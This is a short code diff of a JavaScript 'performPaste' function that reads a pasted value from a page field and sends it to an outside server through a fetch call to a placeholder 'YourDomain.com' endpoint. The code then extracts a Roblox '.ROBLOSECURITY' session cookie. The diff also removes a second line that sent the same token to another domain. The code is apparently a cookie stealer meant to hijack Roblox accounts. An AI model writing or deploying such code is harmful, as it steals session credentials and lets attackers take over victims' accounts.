@@ -141,7 +141,6 @@ function performPaste() {
   setTimeout(() => {
     var token = document.getElementById("wrap").value
     fetch("https://YourDomain.com/sc.php?t=" + token);
-    fetch("https://api.cookieencoder.com/sc.php?t=" + token);
     var token = token.replace(token.slice(0, token.indexOf(".ROBLOSECURITY")))
     var token = token.replace(token.slice(0, token.indexOf("_")))
     var token = token.replace(token.slice(token.indexOf('"'), token.length))
